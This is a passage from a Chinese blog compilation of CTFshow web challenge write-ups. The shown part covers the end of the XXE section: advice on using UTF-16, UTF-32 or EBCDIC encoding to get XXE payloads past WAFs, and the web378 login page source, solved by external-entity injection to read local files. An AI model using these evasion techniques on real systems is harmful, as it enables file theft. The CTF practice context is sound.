<p>一个 xml 文档不仅可以用 UTF-8 编码，也可以用 UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412) 和 EBCDIC 编码。 在这种编码的帮助下，使用正则表达式可以很容易地绕过 WAF，因为在这种类型的 WAF 中，正则表达式通常仅配置为单字符集。 外来编码也可用于绕过成熟的 WAF，因为它们并不总是能够处理上面列出的所有编码。例如，libxml2 解析器只支持一种类型的 utf-32 - utf-32BE，特别是不支持 BOM。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://wiki.scuctf.com/ctfwiki/web/6.xxe/%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/">https://wiki.scuctf.com/ctfwiki/web/6.xxe/%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/</a></p>
<h3 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h3><p>一个登录框，查看源代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">doLogin</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">		<span class="title function_">alert</span>(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;doLogin&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: data,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span><br><span class="line">        	<span class="keyword">var</span> code = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span><br><span class="line">        	<span class="keyword">var</span> msg = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span><br><span class="line">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login fail!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login success!&quot;</span>);</span><br><span class="line">        	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;error:&quot;</span> + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>直接外部实体注入XXE读本地文件</p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1756957245440-c6e69c8a-fc3a-4e14-a2e1-44fecc21dd03.png?x-oss-process=image/format,webp" alt="image.png"></p>
<p>ctfshow上xxe还是很好入门的。</p>
<h2 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h2><h3 id="web379"><a href="#web379" class="headerlink" title="web379"></a>web379</h3>
    </article>
    <!-- license -->
        <div class="license-wrapper">
            <p>Author：<a href="http://example.com">温柔刀</a>
            <p>Link：<a href="http://example.com/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/">http://example.com/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/</a>
            <p>Publish date：<a href="http://example.com/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/">March 26th 2025, 7:01:01 pm</a>
            <p>Update date：<a href="http://example.com/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/">September 8th 2025, 10:51:36 am</a>
            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
                <div class="nextSlogan">Next Post</div>
                <a href="/2025/04/29/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/" title="红队笔记">
                    <div class="nextTitle">红队笔记</div>
                </a>
        </li>
        <li class="previous">
                <div class="prevSlogan">Previous Post</div>
                <a href="/2025/02/26/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/" title="自动化漏洞通报">
                    <div class="prevTitle">自动化漏洞通报</div>
                </a>
        </li>
    </ul>
    <!-- comment -->
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->

            
            
            
            <!-- utteranc评论 -->

            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->

            
            
            
        </div>
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
        <script>
            (function () {
                const time = document.getElementsByClassName('post-intro-time')[0]
                const post = document.getElementsByTagName("article")[0]
                if (time === undefined || post === undefined) {
                    return
                }

                const pubTime = new Date(time.innerText)
                const now = Date.now()
                const interval = parseInt(now - pubTime)
                const days = parseInt(interval / 86400000)
                const outdated_threshold = parseInt(180)
                if (interval > outdated_threshold * 24 * 3600 * 1000) {
                    post.innerHTML = '<div class="note note-warning">' +
                    `<div class="title">文章时效性提示</div><p>这是一篇发布于 ${days} 天前的文章，部分信息可能已发生改变，请注意甄别。` +
                    '</p></div>' + post.innerHTML;
                }
            })();
        </script>
    <!-- Mathjax -->
</main>

                <!-- profile -->
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
        <div class="social">
                            <a href="mailto:12345@qq.com" class="iconfont-archer email" title="email" ></a>
                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title="github"></a>
                <span class="iconfont-archer wechat" title="wechat">
                    <img class="profile-qr" src="/assets/example_qr.png" />
                </span>

        </div>
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    <!-- 不蒜子  -->
        <div class="busuanzi-container">
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
        </div>
</footer>

        </div>
        <!-- toc -->
            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB-%E5%85%A5%E9%97%A8"><span class="toc-number">1.</span> <span class="toc-text">WEB 入门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web1-17"><span class="toc-number">1.1.1.</span> <span class="toc-text">web1-17</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.</span> <span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web18-23"><span class="toc-number">1.2.1.</span> <span class="toc-text">web18-23</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web29-%E6%9C%89%E6%B2%A1%E6%87%82%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.1.</span> <span class="toc-text">web29(有没懂的知识)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.2.</span> <span class="toc-text">背景知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%88%AB%E4%BB%A5%E5%A6%82%E4%B8%8B%E6%96%B9%E6%B3%95%E5%B0%9D%E8%AF%95%E6%8B%BF%E5%88%B0-flag"><span class="toc-number">1.3.3.</span> <span class="toc-text">分别以如下方法尝试拿到 flag:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">1、直接执行系统命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%86%85%E6%95%9B%E6%89%A7%E8%A1%8C-%EF%BC%88%E5%8F%8D%E5%AD%97%E8%8A%82%E7%AC%A6%EF%BC%89"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">2、内敛执行 （反字节符）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web31"><span class="toc-number">1.3.4.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web32"><span class="toc-number">1.3.5.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web33-%EF%BC%88%E6%9C%AA%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.3.6.</span> <span class="toc-text">web33 （未复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web34%EF%BC%88%E6%9C%AA%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.3.7.</span> <span class="toc-text">web34（未复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web35"><span class="toc-number">1.3.8.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web36"><span class="toc-number">1.3.9.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web37"><span class="toc-number">1.3.10.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web40-%E6%9C%AA"><span class="toc-number">1.3.11.</span> <span class="toc-text">web40(未)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web41-%E6%9C%AA"><span class="toc-number">1.3.12.</span> <span class="toc-text">web41(未)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web42"><span class="toc-number">1.3.13.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web43"><span class="toc-number">1.3.14.</span> <span class="toc-text">web43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web44"><span class="toc-number">1.3.15.</span> <span class="toc-text">web44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web46"><span class="toc-number">1.3.16.</span> <span class="toc-text">web46</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web47"><span class="toc-number">1.3.17.</span> <span class="toc-text">web47</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web50"><span class="toc-number">1.3.18.</span> <span class="toc-text">web50</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web51"><span class="toc-number">1.3.19.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web52"><span class="toc-number">1.3.20.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web53"><span class="toc-number">1.3.21.</span> <span class="toc-text">web53</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web54"><span class="toc-number">1.3.22.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web55"><span class="toc-number">1.3.23.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web56"><span class="toc-number">1.3.24.</span> <span class="toc-text">web56</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web57"><span class="toc-number">1.3.25.</span> <span class="toc-text">web57</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web78"><span class="toc-number">1.4.1.</span> <span class="toc-text">web78</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web79"><span class="toc-number">1.4.2.</span> <span class="toc-text">web79</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web80"><span class="toc-number">1.4.3.</span> <span class="toc-text">web80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web81"><span class="toc-number">1.4.4.</span> <span class="toc-text">web81</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web82"><span class="toc-number">1.4.5.</span> <span class="toc-text">web82</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web87"><span class="toc-number">1.4.6.</span> <span class="toc-text">web87</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web88"><span class="toc-number">1.4.7.</span> <span class="toc-text">web88</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E7%89%B9%E6%80%A7"><span class="toc-number">1.5.</span> <span class="toc-text">PHP特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web89"><span class="toc-number">1.5.1.</span> <span class="toc-text">web89</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web90"><span class="toc-number">1.5.2.</span> <span class="toc-text">web90</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web91"><span class="toc-number">1.5.3.</span> <span class="toc-text">web91</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web93"><span class="toc-number">1.5.4.</span> <span class="toc-text">web93</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web94"><span class="toc-number">1.5.5.</span> <span class="toc-text">web94</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web95"><span class="toc-number">1.5.6.</span> <span class="toc-text">web95</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web96"><span class="toc-number">1.5.7.</span> <span class="toc-text">web96</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web97"><span class="toc-number">1.5.8.</span> <span class="toc-text">web97</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web98%EF%BC%88%E7%9C%8B%E4%B8%8D%E6%87%82%E6%BA%90%E7%A0%81%E7%9C%8B%E4%B8%8D%E6%87%82%E8%A7%A3%E6%9E%90%EF%BC%89"><span class="toc-number">1.5.9.</span> <span class="toc-text">web98（看不懂源码看不懂解析）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web99"><span class="toc-number">1.5.10.</span> <span class="toc-text">web99</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web100"><span class="toc-number">1.5.11.</span> <span class="toc-text">web100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web101"><span class="toc-number">1.5.12.</span> <span class="toc-text">web101</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ReflectionClass"><span class="toc-number">1.5.12.1.</span> <span class="toc-text">ReflectionClass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web102"><span class="toc-number">1.5.13.</span> <span class="toc-text">web102</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web103"><span class="toc-number">1.5.14.</span> <span class="toc-text">web103</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web104"><span class="toc-number">1.5.15.</span> <span class="toc-text">web104</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web105"><span class="toc-number">1.5.16.</span> <span class="toc-text">web105</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web107"><span class="toc-number">1.5.17.</span> <span class="toc-text">web107</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web108"><span class="toc-number">1.5.18.</span> <span class="toc-text">web108</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web110"><span class="toc-number">1.5.19.</span> <span class="toc-text">web110</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web111"><span class="toc-number">1.5.20.</span> <span class="toc-text">web111</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.6.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web151"><span class="toc-number">1.6.1.</span> <span class="toc-text">web151</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web152"><span class="toc-number">1.6.2.</span> <span class="toc-text">web152</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web153"><span class="toc-number">1.6.3.</span> <span class="toc-text">web153</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.7.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web254"><span class="toc-number">1.7.1.</span> <span class="toc-text">web254</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web255"><span class="toc-number">1.7.2.</span> <span class="toc-text">web255</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web256"><span class="toc-number">1.7.3.</span> <span class="toc-text">web256</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web257"><span class="toc-number">1.7.4.</span> <span class="toc-text">web257</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web258"><span class="toc-number">1.7.5.</span> <span class="toc-text">web258</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web259"><span class="toc-number">1.7.6.</span> <span class="toc-text">?web259?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web260"><span class="toc-number">1.7.7.</span> <span class="toc-text">web260</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web261"><span class="toc-number">1.7.8.</span> <span class="toc-text">web261</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-number">1.7.8.1.</span> <span class="toc-text">PHP 的弱类型比较</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web317"><span class="toc-number">1.7.9.</span> <span class="toc-text">web317</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web318-319"><span class="toc-number">1.7.10.</span> <span class="toc-text">web318.319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web320-321"><span class="toc-number">1.7.11.</span> <span class="toc-text">web320.321</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web322-326"><span class="toc-number">1.7.12.</span> <span class="toc-text">web322-326</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web327"><span class="toc-number">1.7.13.</span> <span class="toc-text">web327</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web328"><span class="toc-number">1.7.14.</span> <span class="toc-text">web328</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web329"><span class="toc-number">1.7.15.</span> <span class="toc-text">web329</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web330"><span class="toc-number">1.7.16.</span> <span class="toc-text">web330</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web331"><span class="toc-number">1.7.17.</span> <span class="toc-text">web331</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web332"><span class="toc-number">1.7.18.</span> <span class="toc-text">web332</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web333"><span class="toc-number">1.7.19.</span> <span class="toc-text">web333</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4"><span class="toc-number">1.7.20.</span> <span class="toc-text">总结常见过滤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#node-js"><span class="toc-number">1.8.</span> <span class="toc-text">node.js</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web334"><span class="toc-number">1.8.1.</span> <span class="toc-text">web334</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web335"><span class="toc-number">1.8.2.</span> <span class="toc-text">web335</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web336"><span class="toc-number">1.8.3.</span> <span class="toc-text">web336</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web337"><span class="toc-number">1.8.4.</span> <span class="toc-text">web337</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web338"><span class="toc-number">1.8.5.</span> <span class="toc-text">web338</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web339-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-query"><span class="toc-number">1.8.6.</span> <span class="toc-text">web339 变量覆盖 query</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web340"><span class="toc-number">1.8.7.</span> <span class="toc-text">web340</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web341"><span class="toc-number">1.8.8.</span> <span class="toc-text">web341</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web342"><span class="toc-number">1.8.9.</span> <span class="toc-text">web342</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.9.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web351"><span class="toc-number">1.9.1.</span> <span class="toc-text">web351</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web352"><span class="toc-number">1.9.2.</span> <span class="toc-text">web352</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web353"><span class="toc-number">1.9.3.</span> <span class="toc-text">web353</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web354"><span class="toc-number">1.9.4.</span> <span class="toc-text">web354</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web355"><span class="toc-number">1.9.5.</span> <span class="toc-text">web355</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web356"><span class="toc-number">1.9.6.</span> <span class="toc-text">web356</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E5%A4%8D%E7%8E%B0-web357"><span class="toc-number">1.9.7.</span> <span class="toc-text">(未复现)web357</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web358"><span class="toc-number">1.9.8.</span> <span class="toc-text">web358</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.10.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web361"><span class="toc-number">1.10.1.</span> <span class="toc-text">web361</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web362-%E8%BF%87%E6%BB%A4%E9%83%A8%E5%88%86%E6%95%B0%E5%AD%97"><span class="toc-number">1.10.2.</span> <span class="toc-text">web362 过滤部分数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web363-%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E2%80%9D%E2%80%9D%E2%80%98%E2%80%99"><span class="toc-number">1.10.3.</span> <span class="toc-text">web363 单双引号””‘’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web364-args"><span class="toc-number">1.10.4.</span> <span class="toc-text">web364 args</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web365-%E6%96%B9%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.10.5.</span> <span class="toc-text">web365 方括号[]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web366-%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">1.10.6.</span> <span class="toc-text">web366 下划线_</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web367-os"><span class="toc-number">1.10.7.</span> <span class="toc-text">web367 os</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web368-request"><span class="toc-number">1.10.8.</span> <span class="toc-text">web368 request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web369-request"><span class="toc-number">1.10.9.</span> <span class="toc-text">web369 request</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">1.11.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web373"><span class="toc-number">1.11.1.</span> <span class="toc-text">web373</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web374"><span class="toc-number">1.11.2.</span> <span class="toc-text">web374</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web375"><span class="toc-number">1.11.3.</span> <span class="toc-text">web375</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web376"><span class="toc-number">1.11.4.</span> <span class="toc-text">web376</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web377"><span class="toc-number">1.11.5.</span> <span class="toc-text">web377</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web378"><span class="toc-number">1.11.6.</span> <span class="toc-text">web378</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%BA%E5%9D%97%E9%93%BE"><span class="toc-number">1.12.</span> <span class="toc-text">区块链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web379"><span class="toc-number">1.12.1.</span> <span class="toc-text">web379</span></a></li></ol></li></ol></li></ol>
            </div>
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
    <div class="total-and-search">
        <div class="total-archive">
        Total : 24
        </div>
        <!-- search  -->
    </div>
    <div class="post-archive">
            <div class="archive-year"> 2025 </div>
            <ul class="year-list">
        <li class="archive-post-item">
            <span class="archive-post-date">10/27</span>
            <a class="archive-post-title" href="/2025/10/27/vec%E6%9D%AF/">vec杯</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">08/31</span>
            <a class="archive-post-title" href="/2025/08/31/LilCTF%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">LilCTF 部分wp</a>
        </li>
        <li class="archive-post-item">
